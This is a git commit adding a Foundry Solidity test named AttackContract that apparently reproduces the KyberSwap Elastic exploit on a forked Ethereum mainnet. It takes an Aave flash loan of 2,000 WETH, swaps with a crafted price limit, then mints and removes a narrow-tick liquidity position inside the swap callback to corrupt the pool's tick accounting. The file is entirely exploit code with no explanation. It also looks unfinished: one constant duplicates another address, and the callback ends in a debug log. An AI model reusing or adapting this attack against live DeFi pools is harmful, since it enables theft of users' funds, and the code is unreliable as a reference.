9cb8f7ddd19678d7b78fc84af07ac3f4be57adf0
peppyeben <austineben34@gmail.com>
2025-08-20 19:41:25 +0100

    kyber

---
+++ test/AttackContract.sol
@@ -0,0 +1,84 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import {Test, console} from "forge-std/Test.sol";
+import "./Interfaces.sol";
+
+contract AttackContract is Test {
+    address public constant ATTACKER = 0xaF2Acf3D4ab78e4c702256D214a3189A874CDC13;
+    address public constant AAVE_POOL_V3 = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
+    address public constant WRAPPED_ETHER = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address public constant FRAX_ETHER = 0x5E8422345238F34275888049021821E8E08CAa1f;
+    address public constant KYBERSWAP_V2_NFT_POSITIONS_MANAGER = 0xe222fBE074A436145b255442D919E4E3A6c6a480;
+    address public constant KYBERSWAP_V2_REINVESTMENT_TOKEN = 0xFd7B111AA83b9b6F547E617C7601EfD997F64703;
+    address public constant KYBERSWAP_ELASTIC_ANTI_SNIPING = 0xe222fBE074A436145b255442D919E4E3A6c6a480;
+
+    function setUp() public {
+        vm.createSelectFork(vm.envString("ETHEREUM_RPC_URL"), 18630391);
+    }
+
+    function test_executeExploit() public {
+        vm.deal(address(this), 1 ether);
+        Interfaces(AAVE_POOL_V3).flashLoanSimple(address(this), WRAPPED_ETHER, 2000000000000000000000, "", 0);
+    }
+
+    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes calldata params)
+        external
+        returns (bool)
+    {
+        Interfaces(FRAX_ETHER).approve(
+            KYBERSWAP_V2_NFT_POSITIONS_MANAGER,
+            115792089237316195423570985008687907853269984665640564039457584007913129639935
+        );
+        Interfaces(WRAPPED_ETHER).approve(
+            KYBERSWAP_V2_NFT_POSITIONS_MANAGER,
+            115792089237316195423570985008687907853269984665640564039457584007913129639935
+        );
+        Interfaces(KYBERSWAP_V2_REINVESTMENT_TOKEN).getPoolState();
+        Interfaces(KYBERSWAP_V2_REINVESTMENT_TOKEN).swap(
+            address(this), 2000000000000000000000, false, 20282409603651670423947251286016, ""
+        );
+
+        return true;
+    }
+
+    function swapCallback(int256 deltaQty0, int256 deltaQty1, bytes calldata data) public {
+        Interfaces(WRAPPED_ETHER).transfer(address(KYBERSWAP_V2_REINVESTMENT_TOKEN), 6849615814404497512);
+        Interfaces(KYBERSWAP_V2_REINVESTMENT_TOKEN).tickDistance();
+        Interfaces(KYBERSWAP_V2_REINVESTMENT_TOKEN).swapFeeUnits();
+
+        Interfaces(KYBERSWAP_V2_REINVESTMENT_TOKEN).getPoolState();
+        Interfaces(KYBERSWAP_V2_REINVESTMENT_TOKEN).getPoolState();
+
+        int24[2] memory ticksPrevious;
+        ticksPrevious[0] = 48;
+        ticksPrevious[1] = 48;
+
+        Interfaces.MintParams memory mintParams = Interfaces.MintParams({
+            token0: FRAX_ETHER,
+            token1: WRAPPED_ETHER,
+            fee: 10,
+            tickLower: 110909,
+            tickUpper: 111310,
+            ticksPrevious: ticksPrevious,
+            amount0Desired: 6948087773336076,
+            amount1Desired: 107809615846697233,
+            amount0Min: 0,
+            amount1Min: 0,
+            recipient: address(this),
+            deadline: 1700693711
+        });
+        Interfaces(KYBERSWAP_V2_NFT_POSITIONS_MANAGER).mint(mintParams);
+
+        Interfaces.RemoveLiquidityParams memory removeLiqParams = Interfaces.RemoveLiquidityParams({
+            tokenId: 359,
+            liquidity: 14938549516730950591,
+            amount0Min: 0,
+            amount1Min: 0,
+            deadline: 1700693711
+        });
+        Interfaces(KYBERSWAP_V2_NFT_POSITIONS_MANAGER).removeLiquidity(removeLiqParams);
+
+        console.log("WE GOT HERE");
+    }
+}
